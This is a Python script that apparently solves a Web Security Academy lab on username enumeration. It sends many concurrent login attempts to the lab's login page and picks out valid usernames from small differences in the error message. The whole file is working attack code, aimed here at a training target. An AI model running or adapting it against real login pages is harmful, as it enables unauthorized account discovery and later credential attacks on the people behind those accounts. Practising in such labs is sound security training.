#!/usr/bin/env python3
# Copyright (c) 2025-present, Swadhin
# Requirements:
# requests==2.32.3
# beautifulsoup4==4.13.4
# aiohttp==3.11.16

import requests
import asyncio
import aiohttp
from bs4 import BeautifulSoup

async def enumerate_username(
    client: aiohttp.ClientSession,
    url: str,
    payload_file: str,
):
    """Asynchronously enumerates usernames."""
    payloads = []

    try:
        with open(payload_file, "r+") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"Error - {e}")
        return

    async def check_username(username):
        """Asynchronously checks a single username."""
        data = {"username": username, "password": "password"}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            async with client.post(
                url, headers=headers, data=data, allow_redirects=False, ssl=False
            ) as res:
                text = await res.text()
                if extract_tag(text) != "Invalid username or password.":
                    print(username, res.status, extract_tag(text))
        except aiohttp.ClientError as e:
            print(f"Error checking {username}: {e}")

    def extract_tag(content: str):
        soup = BeautifulSoup(content, "html.parser")
        warning_tag = soup.find("p", class_="is-warning")

        if warning_tag:
            return warning_tag.get_text()
        else:
            return None

    tasks = [check_username(username) for username in payloads]
    await asyncio.gather(*tasks)


async def main():
    """Main asynchronous function."""
    client = requests.session()

    async with aiohttp.ClientSession(trust_env=True) as client:
        await enumerate_username(
            client,
            url="https://YOUR-LAB-ID.web-security-academy.net/login",
            payload_file="usernames.txt",
        )


if __name__ == "__main__":
    asyncio.run(main())
